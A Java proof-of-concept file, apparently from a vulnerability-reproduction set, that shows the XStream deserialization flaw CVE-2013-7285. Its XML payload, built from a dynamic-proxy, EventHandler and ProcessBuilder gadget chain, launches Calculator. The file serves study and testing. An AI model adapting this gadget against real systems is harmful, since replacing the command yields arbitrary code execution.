package CVE_2013_7285.variant2;

import CVE_2013_7285.variant1.pojo.Contact;
import com.thoughtworks.xstream.XStream;

public class Issue {

    public static void main(String[] args) {

        XStream xstream = new XStream();

        String payload = "<sorted-set>  \n"
            + "  <string>foo</string>\n"
            + "  <dynamic-proxy>\n"
            + "    <interface>java.lang.Comparable</interface>\n"
            + "    <handler class=\"java.beans.EventHandler\">\n"
            + "      <target class=\"java.lang.ProcessBuilder\">\n"
            + "        <command>\n"
            + "          <string>/Applications/Calculator.app/Contents/MacOS/Calculator</string>\n"
            + "        </command>\n"
            + "      </target>\n"
            + "      <action>start</action>\n"
            + "    </handler>\n"
            + "  </dynamic-proxy>\n"
            + "</sorted-set> ";


        Contact contact = (Contact)xstream.fromXML(payload);
        contact.getFirstName();
    }
}
